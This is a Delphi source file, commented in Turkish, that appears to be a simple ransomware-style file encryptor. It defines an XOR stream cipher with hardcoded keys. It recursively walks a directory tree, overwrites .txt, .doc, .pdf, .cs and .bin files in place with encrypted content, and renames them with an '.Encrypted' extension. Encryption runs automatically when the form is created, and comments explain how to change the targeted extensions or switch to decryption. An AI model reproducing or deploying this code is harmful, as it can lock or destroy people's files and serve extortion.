unit UnitS;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs;

type
  TForm1 = class(TForm)
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
type
  TWordTriple = Array[0..10] of Word;
  function MemoryEncrypt(Src: Pointer; SrcSize: Cardinal; Target: Pointer; TargetSize: Cardinal; Key: TWordTriple): boolean;
  function MemoryDecrypt(Src: Pointer; SrcSize: Cardinal; Target: Pointer; TargetSize: Cardinal; Key: TWordTriple): boolean;
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

implementation

{$R *.dfm}

Const
// ENC_EXTENSION Yazan yere þifrelenecek uzantýlarý yaz.
ENC_EXTENSION = '.txt;.doc;.pdf;.cs;.bin;';
// CRYPTEXTENSÝON yazan yere ise þifrelediðinde kullanacaðý uzantýyý yaz.
CRYPTEXTENSÝON = '.Encrypted';
////////////////////////////////////////////////////////////////////////////////

//Klasörün içindeki dosyalarý þifreleme ve çözme - Dosya þifreleme ve çözme /////////////////////////////////////////////////////
function MemoryEncrypt(Src: Pointer; SrcSize: Cardinal; Target: Pointer; TargetSize: Cardinal; Key: TWordTriple): boolean;
var
  pIn, pOut: ^byte;
  i : Cardinal;
begin
try
  if SrcSize = TargetSize then
  begin
    pIn := Src;
    pOut := Target;
    for i := 1 to SrcSize do
    begin
      pOut^ := pIn^ xor (Key[10] shr 8);
      Key[10] := Byte(pIn^ + Key[10]) * Key[0] + Key[1] + Key[2] + Key[3] + Key[4] + Key[5] + Key[6] + Key[7] + Key[8] + Key[9];
      inc(pIn);
      inc(pOut);
    end;
    Result := True;
  end else
    Result := False;
except
end;
end;
function MemoryDecrypt(Src: Pointer; SrcSize: Cardinal; Target: Pointer; TargetSize: Cardinal; Key: TWordTriple): boolean;
var
  pIn, pOut: ^byte;
  i : Cardinal;
begin
try
  if SrcSize = TargetSize then
  begin
    pIn := Src;
    pOut := Target;
    for i := 1 to SrcSize do
    begin
      pOut^ := pIn^ xor (Key[10] shr 8);
      Key[10] := byte(pOut^ + Key[10]) * Key[0] + Key[1] + Key[2] + Key[3] + Key[4] + Key[5] + Key[6] + Key[7] + Key[8] + Key[9];
      inc(pIn);
      inc(pOut);
    end;
    Result := True;
  end else
    Result := False;
except
end;
end;
function FileEncrypt(InFile : String; Key: TWordTriple): boolean;
var
  MIn, MOut: TMemoryStream;
begin
try
  MIn := TMemoryStream.Create;
  MOut := TMemoryStream.Create;
  Try
    MIn.LoadFromFile(InFile);
    MOut.SetSize(MIn.Size);
    Result := MemoryEncrypt(MIn.Memory, MIn.Size, MOut.Memory, MOut.Size, Key);
    MOut.SaveToFile(InFile);
    MoveFile(PChar(InFile), PChar(InFile + CRYPTEXTENSÝON));
  finally
    MOut.Free;
    MIn.Free;
  end;
except
end;
end;
function FileDecrypt(InFile : String; Key: TWordTriple): boolean;
var
  MIn, MOut: TMemoryStream;
begin
try
if FileExists(Copy(InFile, 0, LastDelimiter('.',InFile) - 1) + CRYPTEXTENSÝON) then
begin
  MIn := TMemoryStream.Create;
  MOut := TMemoryStream.Create;
  Try
    MIn.LoadFromFile(InFile);
    MOut.SetSize(MIn.Size);
    Result := MemoryDecrypt(MIn.Memory, MIn.Size, MOut.Memory, MOut.Size, Key);
    MOut.SaveToFile(InFile);
    MoveFile(PChar(InFile), PChar(Copy(InFile, 0, LastDelimiter('.',InFile) - 1)));
  finally
    MOut.Free;
    MIn.Free;
  end;
end;
except
end;
end;
procedure DirectoryEncryption(const PathName: string; EncKeys : TWordTriple);
const
  FileMask = '*.*';
var
  Rec: TSearchRec;
  Path: string;
begin
try
  Path := IncludeTrailingBackslash(PathName);
  if FindFirst(Path + FileMask, faAnyFile - faDirectory, Rec) = 0 then
    try
      repeat
        if AnsiPos(ExtractFileExt(Rec.Name), ENC_EXTENSION) > 0 then
        //
        FileEncrypt(Path + Rec.Name, EncKeys);
        //
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;
  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
    try
      repeat
        if ((Rec.Attr and faDirectory) <> 0) and (Rec.Name <> '.') and
          (Rec.Name <> '..') then
          DirectoryEncryption(Path + Rec.Name, EncKeys);
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;
except
end;
end;
procedure DirectoryDecryption(const PathName: string; DecKeys : TWordTriple);
const
  FileMask = '*.*';
var
  Rec: TSearchRec;
  Path: string;
begin
try
  Path := IncludeTrailingBackslash(PathName);
  if FindFirst(Path + FileMask, faAnyFile - faDirectory, Rec) = 0 then
    try
      repeat
        if AnsiPos(ExtractFileExt(Rec.Name), CRYPTEXTENSÝON) > 0 then
        //
        FileDecrypt(Path + Rec.Name, DecKeys);
        //
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;
  if FindFirst(Path + '*.*', faDirectory, Rec) = 0 then
    try
      repeat
        if ((Rec.Attr and faDirectory) <> 0) and (Rec.Name <> '.') and
          (Rec.Name <> '..') then
          DirectoryDecryption(Path + Rec.Name, DecKeys);
      until FindNext(Rec) <> 0;
    finally
      FindClose(Rec);
    end;
except
end;
end;
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


///// Kullanýmý /////
procedure TForm1.FormCreate(Sender: TObject);
var
Keyz : TWordTriple;
begin
//Key
Keyz[0] := 11122;
Keyz[1] := 23215;
Keyz[2] := 51143;
Keyz[3] := 42351;
Keyz[4] := 33341;
Keyz[5] := 44512;
Keyz[6] := 44225;
Keyz[7] := 25442;
Keyz[8] := 11464;
Keyz[9] := 44678;
Keyz[10] := 51344;
// DirectoryEncryption yazan yeri DirectoryDecryption yapabilrsin dosya çözmek için
DirectoryEncryption('C:\Users\Casper\Desktop\ConfuserEx-master - Kopya', Keyz);
end;

end.
